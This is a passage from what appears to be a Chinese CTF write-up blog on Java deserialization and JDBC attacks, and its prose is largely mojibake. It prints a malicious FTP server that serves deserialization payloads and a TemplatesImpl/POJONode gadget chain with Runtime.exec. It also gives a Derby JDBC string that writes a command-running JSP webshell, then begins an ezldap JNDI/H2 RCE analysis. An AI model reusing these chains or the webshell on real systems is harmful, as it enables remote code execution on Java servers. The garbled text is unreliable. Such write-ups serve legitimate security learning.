æ–‡ä»¶ä¸€è¾¹ç«äº‰<code>fd</code>å°±å¯ä»¥ååºåˆ—åŒ–æˆ‘ä»¬æŒ‡å®šçš„å†…å®¹ï¼Œè¯¥æ–¹æ³•æˆåŠŸç‡ä¸é«˜ä¸”ä¸å¤ªä¼˜é›…ã€‚</p><p>è¿™é‡Œé€šè¿‡<code>new URL</code>è¯»å–<code>file://</code>å‰ç¼€è¿˜æœ‰å¦å¤–ä¸€ç§è§£æ³•ï¼Œå…¶å®<code>java</code>çš„<code>file</code>åè®®å¯ä»¥æ‰“<code>ftp</code>åˆ©ç”¨ã€‚è·Ÿä¸€ä¸‹<code>getInputStream</code>è°ƒç”¨ï¼Œ<code>openConnection</code>è¿™é‡Œä¼šå–<code>host</code>ã€‚</p><p>çƒ­çŸ¥è¯†ï¼š<code>file</code>åè®®æ˜¯æ”¯æŒ<code>host</code>çš„ï¼Œå¦‚<code>file://127.0.0.1/etc/passwd</code>ã€‚</p><p>çœ‹<code>getInputStream</code>é€»è¾‘çš„è¯å‘ç°å¦‚æœ<code>host</code>ä¸ä¸ºç©ºå¹¶ä¸”ä¸æ˜¯<code>localhost</code>ï¼Œé‚£ä¹ˆä¼šé€šè¿‡<code>ftp</code>åè®®è¯·æ±‚è¿œç¨‹èµ„æºã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240621002959761.png" alt="image-20240621002959761"></p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥ä¼ªé€ <code>ftp server</code>ï¼Œæœ€ç»ˆæŒ‡å®š<code>processedPath</code>ä¸º<code>file://ftp_server/flag</code>å³å¯æ§åˆ¶é¶æœºå‘<code>ftp server</code>è¯·æ±‚æˆ‘ä»¬æŒ‡å®šååºåˆ—åŒ–çš„å†…å®¹ã€‚</p><p>è€Œ<code>canonicalPath</code>è¿™é‡Œè€ƒå¯Ÿçš„æ˜¯å‰æ®µæ—¶é—´<code>Nexus-Reposity</code>çš„ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ã€‚ä¸è¿‡ä¹Ÿæ²¡æœ‰è€ƒå¯Ÿåˆ°æ¼æ´æœ¬è´¨ï¼Œå®é™…ä¸Šå°±æ˜¯å¾ˆæ­£å¸¸çš„é€šè¿‡<code>../</code>å°±èƒ½æ¶ˆå»ä¸€ä¸ª<code>/</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240621003013075.png" alt="image-20240621003013075"></p><p>PSï¼šä¸èƒ½å®Œå…¨ç›¸ä¿¡<code>JD-GUI</code>çš„åç¼–è¯‘ç»“æœï¼Œåªèƒ½è¯´å’Œ<code>fernflower</code>å„æœ‰åƒç§‹å§ã€‚æ¯”èµ›çš„æ—¶å€™ç”¨<code>JD-GUI</code>åç¼–è¯‘å‡ºæ¥çš„<code>canonicalPath</code>é€»è¾‘å±…ç„¶å’ŒåŸç‰ˆæ˜¯ä¸ä¸€æ ·çš„ï¼Œå¯¼è‡´æ ¹æœ¬æ²¡æœ‰<code>normalize</code>è·¯å¾„ã€‚</p><p>æ—¢ç„¶å¯ä»¥å°†<code>processedPath</code>ä¿®æ”¹ä¸º<code>file://127.0.0.1/xxx</code>çš„å½¢å¼ï¼Œé‚£ä¹ˆå†™ä¸€ä¸ªæ¶æ„<code>ftp server</code>:</p><pre class="line-numbers language-Python"><code class="language-Python">import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.bind(('0.0.0.0', 21))s.listen(1)conn, addr = s.accept()conn.send(b'220 welcome\n')print(conn.recv(1024))conn.send(b'331 Please specify the password.\n')print(conn.recv(1024))conn.send(b'230 Login successful.\n')print(conn.recv(1024))conn.send(b'200 /etc/passwd\n')print(conn.recv(1024))conn.send(b'1 to Passive.\n')print(conn.recv(1024))# linux# conn.send(b'227 Entering Extended Passive Mode (127.0.0.1,0,900)\n')# windowsconn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,900)\n')print(conn.recv(1024))conn.send(b'221 Goodbye.\n')print(conn.recv(1024))conn.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¢«åŠ¨æ¨¡å¼ï¼š</p><pre class="line-numbers language-Python"><code class="language-Python">import socketimport base64s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.bind(('0.0.0.0', 900))s.listen(1)evil_based_string = "MQ=="evil_bytes = base64.b64decode(evil_based_string)conn, addr = s.accept()conn.send(evil_bytes+b'\n')print("ok")conn.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è‡³æ­¤ï¼Œå®Œæˆäº†é€šè¿‡<code>ftp</code>åè®®åŠ è½½ä»»æ„ååºåˆ—åŒ–å†…å®¹ã€‚</p><h4 id="ååºåˆ—åŒ–è§¦å‘getConnection"><a href="#ååºåˆ—åŒ–è§¦å‘getConnection" class="headerlink" title="ååºåˆ—åŒ–è§¦å‘getConnection"></a>ååºåˆ—åŒ–è§¦å‘getConnection</h4><p>åç¼–è¯‘é¢˜ç›®ç»™å‡ºçš„<code>war</code>åŒ…å¯çŸ¥è¿œç¨‹ä¸º<code>jdk15</code>ï¼Œè€Œé¢˜ç›®åˆæä¾›äº†ä¸€ä¸ª<code>getConnection</code>ï¼Œç»“åˆ<code>derby</code>ä¾èµ–åº”è¯¥æ˜¯æ‰“<code>derby jdbc</code>æ”»å‡»ã€‚</p><pre class="line-numbers language-Java"><code class="language-Java">/*    */   public Connection getConnection() throws SQLException {/*  9 */     DriverManager.getConnection(this.conStr);/* 10 */     return null;/*    */   }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è§‚å¯Ÿåˆ°<code>PendingDataSource</code>æ¥å£ç±»åªæœ‰ä¸€ä¸ª<code>getConnection</code>æ–¹æ³•ï¼Œå› æ­¤å¯ä»¥é€šè¿‡<code>JdkDynamicAopProxy</code>å°è£…<code>POJONODE</code>è¿›è€Œç¨³å®šè§¦å‘<code>getConnection</code>æ–¹æ³•ã€‚</p><p>æ•´æ¡é“¾å­ï¼š<code>XString--&gt;POJONODE#toString--&gt;CustomDataSource#getConnection--&gt;deby jdbc attack</code>ã€‚</p><pre class="line-numbers language-Java"><code class="language-Java">package com.galery.art.tools;import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.org.apache.xpath.internal.objects.XString;import javassist.*;import org.springframework.aop.framework.AdvisedSupport;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.*;import java.util.HashMap;import java.util.zip.GZIPOutputStream;public class r3a {    //BadAttributeValueExpException.toString -> POJONode -> getter -> TemplatesImpl    public static void main(String[] args) throws Exception {//        final Object template = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);//        final Object template = GadgetUtils.templatesImplLocalWindows();        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");        ctClass.removeMethod(writeReplace);        // å°†ä¿®æ”¹åçš„CtClassåŠ è½½è‡³å½“å‰çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ä¸­        ctClass.toClass();        POJONode node = new POJONode(makeTemplatesImplAopProxy());        Object o = xString1(node);        serialize(o);    }    public static String serialize(final Object obj) throws IOException {        FileOutputStream fileOutputStream = new FileOutputStream("squirt1e.ser");        serialize(obj,fileOutputStream);        fileOutputStream.close();        return "test1.ser";    }    public static void serialize(final Object obj, final OutputStream out) throws IOException {        GZIPOutputStream gzipOutputStream = new GZIPOutputStream(out);        ObjectOutputStream objectOutputStream = new ObjectOutputStream(gzipOutputStream);        objectOutputStream.writeObject(obj);        objectOutputStream.flush();        gzipOutputStream.finish();    }    public static Object xString1(Object node) throws Exception {        XString xString = new XString("Squirt1e");        HashMap map1 = new HashMap();        HashMap map2 = new HashMap();        map1.put("yy",node);        map1.put("zZ",xString);        map2.put("yy",xString);        map2.put("zZ",node);        Object o = makeMap(map1,map2);        return o;    }    public static HashMap makeMap (Object v1, Object v2 ) throws Exception{        HashMap s = new HashMap();        setFieldValue(s, "size", 2);        Class nodeC;        try {            nodeC = Class.forName("java.util.HashMap$Node");        }        catch ( ClassNotFoundException e ) {            nodeC = Class.forName("java.util.HashMap$Entry");        }        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);        nodeCons.setAccessible(true);        Object tbl = Array.newInstance(nodeC, 2);        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));        setFieldValue(s, "table", tbl);        return s;    }    public static void setFieldValue(Object obj1,String str,Object obj2) throws NoSuchFieldException, IllegalAccessException {        Field field2 = obj1.getClass().getDeclaredField(str);//è·å–PriorityQueueçš„comparatorå­—æ®µ        field2.setAccessible(true);//æš´åŠ›åå°„        field2.set(obj1, obj2);//è®¾ç½®queueçš„comparatorå­—æ®µå€¼ä¸ºcomparator    }    public static Object makeTemplatesImplAopProxy() throws Exception {        AdvisedSupport advisedSupport = new AdvisedSupport();        CustomDataSource customDataSource = new CustomDataSource();        setFieldValue(customDataSource,"conStr","jdbc:derby://xxx");        advisedSupport.setTarget(customDataSource);        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);        constructor.setAccessible(true);        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{PendingDataSource.class}, handler);        return proxy;    }    public static TemplatesImpl getTemplatesImpl(String cmd) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException {        String cm = "new String[]{\"/bin/bash\",\"-c\",\""+cmd+"\"}";        return createTemplatesImpl(cm);    }    public static TemplatesImpl createTemplatesImpl(String cmd)throws CannotCompileException, NotFoundException, IOException, InstantiationException, IllegalAccessException, NoSuchFieldException{        ClassPool pool = ClassPool.getDefault();        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));        CtClass cc = pool.makeClass("SOTA");        //æœ¬æœºæµ‹è¯•        if(cmd.contains("calc")){            cc.makeClassInitializer().insertBefore("java.lang.Runtime.getRuntime().exec(\"calc\");");        }else {            cc.makeClassInitializer().insertBefore("java.lang.Runtime.getRuntime().exec("+cmd+");");        }//        System.out.println("java.lang.Runtime.getRuntime().exec("+cmd+");");        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));        cc.writeFile();        byte[] classBytes = cc.toBytecode();        byte[][] targetByteCodes = new byte[][]{classBytes};        //è¡¥å……å®ä¾‹åŒ–æ–°å»ºç±»æ‰€éœ€çš„æ¡ä»¶        TemplatesImpl templates = TemplatesImpl.class.newInstance();        setFieldValue(templates, "_bytecodes", targetByteCodes);        setFieldValue(templates, "_name", "Squirtle");        setFieldValue(templates,"_class",null);        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());        return templates;    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è§¦å‘<code>getConnection</code>ï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240621003030537.png" alt="image-20240621003030537"></p><p>é“¾å­å€’æ˜¯å¥½å†™ï¼Œä½†é¢˜ç›®ä¾èµ–æä¾›çš„<code>derby-client</code>ä»æœªè§è¿‡ï¼Œç½‘ä¸Šä¼ çš„<code>derby jdbc</code>ååºåˆ—åŒ–æ²¡æœ‰å¤ªå¤šç”¨å¤„ï¼Œå› ä¸ºé¢˜ç›®æœ¬èº«å°±æ˜¯ä¸ªæ— é™åˆ¶çš„ååºåˆ—åŒ–ã€‚</p><p>æ¥ä¸‹æ¥éœ€è¦è°ƒè¯•<code>derby-client</code>çœ‹çœ‹æœ‰æ²¡æœ‰æ–°çš„åˆ©ç”¨ã€‚</p><h4 id="derby-client-jdbcä»»æ„æ–‡ä»¶å†™å…¥"><a href="#derby-client-jdbcä»»æ„æ–‡ä»¶å†™å…¥" class="headerlink" title="derby-client jdbcä»»æ„æ–‡ä»¶å†™å…¥"></a>derby-client jdbcä»»æ„æ–‡ä»¶å†™å…¥</h4><p>è¿™é‡Œæœ‰ä¸ªå‘ï¼Œåç¼–è¯‘<code>war</code>å¾—åˆ°çš„<code>derby-client.jar</code>åœ¨<code>IDEA</code>é‡Œä¸èƒ½<code>DEBUG</code>ï¼Œä¼šæ˜¾ç¤ºè¡Œå·ä¸åŒ¹é…ï¼Ÿæ¯”èµ›æ—¶å°±å¡åœ¨è¿™é‡Œäº†ï¼Œä¸èƒ½è°ƒè¯•çš„è¯å®Œå…¨æ²¡æœ‰åšé¢˜æ¬²æœ›ã€‚</p><p>è§£å†³æ–¹æ¡ˆæ˜¯ä¸‹è½½å®˜ç½‘æä¾›çš„<code>db-derby-10.14.2.0-lib-debug</code>ç‰ˆæœ¬:</p><p><a href="https://db.apache.org/derby/releases/release-10_14_2_0.html">https://db.apache.org/derby/releases/release-10_14_2_0.html</a></p><p>ä½¿ç”¨è¯¥ç‰ˆæœ¬å¯ä»¥æ­£å¸¸è°ƒè¯•ï¼š</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240621003129006.png" alt="image-20240621003129006"></p><p>çœ‹è§£æ<code>jdbc</code>è¿æ¥ä¸²çš„é€»è¾‘ï¼Œè§£æé€»è¾‘å¯¹åº”çš„å®ç°æ˜¯<code>tokenizeXXX</code>å¼€å¤´çš„æ–¹æ³•ã€‚è®©å¤§æ¨¡å‹è¯»ä¸€éæˆ–è€…è‡ªå·±è°ƒä¸€éå¯çŸ¥å‰ç¼€éœ€è¦ä¸º<code>jdbc:derby//ip:port/</code>çš„æ ¼å¼ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240621003152545.png" alt="image-20240621003152545"></p><p>è€Œ<code>tokenizeURLPropertiess</code>æ˜¯ç”¨æ¥è§£æå±æ€§çš„ï¼Œå±æ€§è¿™é‡Œä»¥;ä¸ºåˆ†éš”ç¬¦ã€‚<code>tokenizeAttributes</code>æ˜¯æŠŠå±æ€§å­—ç¬¦ä¸²ï¼ˆè¿™é‡Œä¸º;create&#x3D;true;ï¼‰å¡åˆ°<code>properties</code>å½“ä¸­ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240621003219213.png" alt="image-20240621003219213"></p><p>è€Œæ¥ä¸‹æ¥ä¼šè§£æ<code>traceLevel</code>ï¼Œè¿™é‡Œäº†è§£è¿‡<code>pgsql jdbc</code>æ”»å‡»çš„è¯å¾ˆå®¹æ˜“è”æƒ³åˆ°è¿™é‡Œå¯èƒ½ä¼šæœ‰<code>log</code>æ—¥å¿—å¯¼è‡´çš„ä»»æ„æ–‡ä»¶å†™å…¥é—®é¢˜ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240621003236263.png" alt="image-20240621003236263"></p><p><code>getTraceLevel</code>å°±æ˜¯è§£æ<code>properties</code>å½“ä¸­çš„<code>traceLevel</code>ã€‚</p><p>èµ°åˆ°åé¢<code>BasicClientDataSource40.computeDncLogWriterForNewConnection</code>ä¼šåˆå§‹åŒ–<code>LogWriter</code>ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ª<code>BasicClientDataSource40.getTraceFile(augmentedProperties)</code>,å–çš„æ˜¯<code>jdbc</code>è¿æ¥ä¸­çš„<code>traceFile</code>å±æ€§ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240621003257828.png" alt="image-20240621003257828"></p><p>å°†<code>jdbc</code>è¿æ¥ä¸²æ”¹ä¸º<code>jdbc:derby://127.0.0.1:0/tmp/myderby;create=true;traceLevel=16;traceFile=E://ctf/squirt1e.jsp;</code>ç»§ç»­è°ƒã€‚</p><p>æœ€ç»ˆ<code>getPrintWriter</code>ä¼šé€šè¿‡<code>new File</code>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œæ–‡ä»¶è·¯å¾„æ­£æ˜¯<code>traceFile</code>ï¼Œä¸è¿‡æ­¤æ—¶æ–‡ä»¶å¹¶æ²¡æœ‰å†…å®¹ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240621003323454.png" alt="image-20240621003323454"></p><p>è·å¾—<code>LogWriter</code>ä¹‹åï¼Œä¼šè°ƒç”¨<code>getFactory().newNetConnection</code>æ–¹æ³•ï¼Œè¿›è€Œè§¦å‘<code>NetConnection</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240621003345550.png" alt="image-20240621003345550"></p><p>ç„¶åèµ°åˆ°<code>traceConnectEntry</code>ï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªåˆ†æ”¯ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240621003357809.png" alt="image-20240621003357809"></p><p><code>traceLevel</code>ä¸º16ä¼šèµ°åˆ°ä¸‹å›¾ï¼Œå³è°ƒç”¨<code>printWrite.println</code>å†™å…¥æ–‡ä»¶å†…å®¹ã€‚è¿™é‡Œå†…å®¹ä¸ºç¡¬ç¼–ç ä¸å¯æ§çš„å­—ç¬¦ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240621003442397.png" alt="image-20240621003442397"></p><p>è§‚å¯Ÿåˆ°<code>traceLevel</code>ä¸º32æ—¶ä¼šå†™å…¥<code>properties</code>ï¼Œå› æ­¤<code>content</code>ä¹Ÿæ˜¯å®Œå…¨å¯æ§çš„ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240621003531338.png" alt="image-20240621003531338"></p><p>å°†jdbcè¿æ¥ä¸²æ”¹ä¸ºå¦‚ä¸‹å½¢å¼ï¼š</p><pre class="line-numbers language-Java"><code class="language-Java">jdbc:derby://127.0.0.1:0/tmp/myderby;create=true;traceLevel=32;traceFile=E://ctf/squirt1e.jsp;pwned=<%out.write(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(new String[]{\"/bin/bash\", \"-c\", \"whoami\"}).getInputStream())).readLine())\\u003b%><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆåŠŸå†™å…¥<code>jsp</code>ã€‚å¦å¤–é¢˜ç›®è¿˜æœ‰<code>thymeleaf</code>ï¼Œè¦†ç›–<code>thymeleaf</code>æ‰“æ¨¡ç‰ˆæ³¨å…¥åº”è¯¥ä¹Ÿå¯ä»¥ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20240621003550783.png" alt="image-20240621003550783"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javaå®‰å…¨ </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»ezldapçœ‹å—é™çš„é«˜ç‰ˆæœ¬jdkç¯å¢ƒä¸‹jndiæ”»å‡»ä¹‹ldapåˆ©ç”¨æ€è·¯</title>
      <link href="/2024/05/29/ldap-ti-jie/"/>
      <url>/2024/05/29/ldap-ti-jie/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ–‡ç« é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼Œ<a href="https://xz.aliyun.com/t/14666">ä¼ é€é—¨</a>ã€‚</p></blockquote><h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><p>äº¬éºŸCTFè¿™æ¬¡çš„é¢˜éå¸¸ç¬¦åˆæˆ‘çš„èƒƒå£ï¼Œ0è§£çš„<code>activemq</code>æ˜¯ä¸ª<code>nday</code>ä¸å‡ºç½‘çš„åˆ©ç”¨åœºæ™¯ï¼Œå¾ˆ<code>realworld</code>ä½†æ˜¯ä¼¼ä¹æ”¯æ’‘ä¸äº†ä¸€ä¸ªæ–‡ç« ï¼Œä¹‹å‰äº†è§£è¿‡é‚£ä¸ªåˆ©ç”¨ç±»çš„è¯é‚£ä¹ˆæ¢ä¸ªåœºæ™¯å¾ˆå¿«å°±èƒ½æ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼Œä¸çŸ¥é“çš„è¯ä½ å°±èŠ±æ—¶é—´åç‰¢å»æ‰¾å§ã€‚</p><p>ç›¸æ¯”äº<code>activemq</code>ï¼Œæˆ‘å¯¹<code>ezldap</code>æ›´æ„Ÿå…´è¶£ã€‚è¿™é“é¢˜ä¸»è¦æ˜¯è€ƒå¯Ÿäº†åœ¨<code>truestSerialData</code>å…³é—­çš„åœºæ™¯ä¸‹é€šè¿‡<code>jndi:ldap</code>åè®®æ‰“æœ¬åœ°å·¥å‚ç±»çš„ç»•è¿‡ï¼Œåœ¨ä¹‹å‰æˆ‘æ ¹æœ¬ä¸çŸ¥é“é«˜<code>jdk</code>ç‰ˆæœ¬ä¸‹çš„<code>jndi:ldap</code>åˆ©ç”¨å¯ä»¥æ‰“æœ¬åœ°å·¥å‚ç±»ï¼Œå±å®æ˜¯å­¦åˆ°äº†ã€‚</p><p>è¿™ç¯‡æ–‡ç« åœ¨å…ˆçŸ¥çš„æ ‡é¢˜å«<code>ezldap</code>é¢˜è§£ï¼Œä½†å®é™…ä¸Šæœ¬æ–‡å¤§éƒ¨åˆ†éƒ½æ˜¯åœ¨åˆ†æ<code>ldap</code>å®¢æˆ·ç«¯çš„è§£æé€»è¾‘ï¼Œäºæ˜¯è¿™é‡Œå°±æ¢ä¸ªæ ‡é¢˜ã€‚ä¹‹å‰éƒ½æ˜¯<code>rmi</code>æ‰“æœ¬åœ°å·¥å‚ç±»ç»•è¿‡ï¼Œ<code>ldap</code>æ‰“æœ¬åœ°<code>gadget</code>ã€‚è¿™ä¸‹ç«Ÿç„¶åè¿‡æ¥äº†ï¼Œ<code>rmi</code>å¯ä»¥æ‰“ååºåˆ—åŒ–ï¼Œè€Œ<code>ldap</code>åå€’å¯ä»¥æ‰“æœ¬åœ°å·¥å‚ç±»ã€‚</p><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>å¼€å±€ç»™äº†ä¸ª<code>actuator</code>æœªæˆæƒè®¿é—®ã€‚</p><p><a href="http://116.198.74.135:31157/actuator">http://116.198.74.135:31157/actuator</a></p><p>çœŸæ­£æœ‰ç”¨çš„åº”è¯¥æ˜¯ä¸‹é¢å››ä¸ªç«¯ç‚¹ï¼š</p><pre><code>/actuator/env/actuator/heapdump/actuator/configprops/actuator/mappings</code></pre><p>æœ€æœ‰ç”¨çš„è¿˜æ˜¯<code>heapdump</code>ï¼Œé€šè¿‡<code>MAT</code>ç®€å•åˆ†æå¯çŸ¥ç›®æ ‡ç‰ˆæœ¬æ˜¯<code>jdk17</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/5e7dc27eae79ee5d160d4ae17aeaf1f.png" alt="5e7dc27eae79ee5d160d4ae17aeaf1f"></p><p>é€šè¿‡<code>heapdump_tool</code>ç­›é€‰ç”¨åˆ°çš„ä¾èµ–ã€‚</p><pre><code>byte-buddy-1.12.23.jarantlr-2.7.7.jarh2-2.1.214.jarclassmate-1.5.1.jarjackson-core-2.13.5.jarjul-to-slf4j-1.7.36.jarmicrometer-core-1.9.17.jarhibernate-commons-annotations-5.1.2.Final.jarjakarta.annotation-api-1.3.5.jartomcat-jdbc-9.0.83.jarjaxb-runtime-2.3.9.jarjandex-2.4.2.Final.jartomcat-embed-core-9.0.83.jarjackson-datatype-jsr310-2.13.5.jarspring-boot-actuator-2.7.18.jarlogback-classic-1.2.12.jarspring-boot-actuator-autoconfigure-2.7.18.jarLatencyUtils-2.0.3.jarhibernate-core-5.6.15.Final.jarjakarta.activation-1.2.2.jarHdrHistogram-2.1.12.jartxw2-2.3.9.jaraspectjweaver-1.9.7.jarspring-expression-5.3.31.jarjakarta.activation-api-1.2.2.jarspring-jdbc-5.3.31.jarjackson-datatype-jdk8-2.13.5.jarjakarta.persistence-api-2.2.3.jartomcat-juli-9.0.83.jarlog4j-to-slf4j-2.17.2.jarjackson-annotations-2.13.5.jarslf4j-api-1.7.36.jarjackson-databind-2.13.5.jarsnakeyaml-1.30.jarjboss-logging-3.4.3.Final.jarspring-boot-jarmode-layertools-2.7.18.jarspring-beans-5.3.31.jarjackson-module-parameter-names-2.13.5.jartomcat-embed-el-9.0.83.jarjakarta.transaction-api-1.3.3.jaristack-commons-runtime-3.0.12.jarjakarta.xml.bind-api-2.3.3.jar</code></pre><p>çœ‹åˆ°æœ‰<code>tomcat-jdbc-9.0.83.jar</code>ä»¥åŠ<code>h2-2.1.214.jar</code>å°±åº”è¯¥èƒ½çŒœåˆ°è¿™é¢˜å¤§æ¦‚ç‡æ˜¯è¦æ‰“<code>h2 jdbc RCE</code>äº†ã€‚</p><p>è€Œé€šè¿‡åˆ†æ<code>/actuator/mappings</code>å¯çŸ¥æœ‰ä¸¤ä¸ªè·¯ç”±ï¼š</p><pre><code>/source_tr15d0/lookup</code></pre><p>è®¿é—®<code>/source_tr15d0</code>æ‹¿åˆ°<code>lookup</code>æºç ã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/lookup"</span><span class="token punctuation">)</span> <span class="token keyword">public</span> String <span class="token function">lookup</span><span class="token punctuation">(</span>String path<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">try</span> <span class="token punctuation">{</span>         String url <span class="token operator">=</span> <span class="token string">"ldap://"</span> <span class="token operator">+</span> path<span class="token punctuation">;</span>         InitialContext initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         initialContext<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> <span class="token string">"ok"</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamingException</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token keyword">return</span> <span class="token string">"failed"</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é™åˆ¶äº†åªèƒ½<code>ldap</code>æ³¨å…¥ã€‚è€Œåˆ†æ<code>actuator/env</code>å¯çŸ¥è®¾ç½®äº†<code>truestSerialData</code>ä¸º<code>false</code>ï¼Œè¿™ç‚¹åé¢åˆ†æä¼šè®²ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716782395965.jpg" alt="1716782395965"></p><h4 id="æµ‹è¯•ç¯å¢ƒæ­å»º"><a href="#æµ‹è¯•ç¯å¢ƒæ­å»º" class="headerlink" title="æµ‹è¯•ç¯å¢ƒæ­å»º"></a>æµ‹è¯•ç¯å¢ƒæ­å»º</h4><p>ä¸»è¦å°±æ˜¯è¦æœ‰ä¸ª<code>tomcat-jdbc</code>å’Œ<code>h2</code>ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1716782963736.png" alt="1716782963736"></p><p><code>jdk</code>è®¾ç½®ä¸º<code>17.0.8</code>ï¼Œç‰ˆæœ¬å·®ä¸å¤šå°±è¡Œã€‚</p><p>ç„¶åè¿˜è¦è®¾ç½®<code>com.sun.jndi.ldap.object.trustSerialData</code>ä¸º<code>false</code>ã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>InitialContext<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//import com.sun.jndi.ldap.Obj;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>h2<span class="token punctuation">.</span>Driver<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span 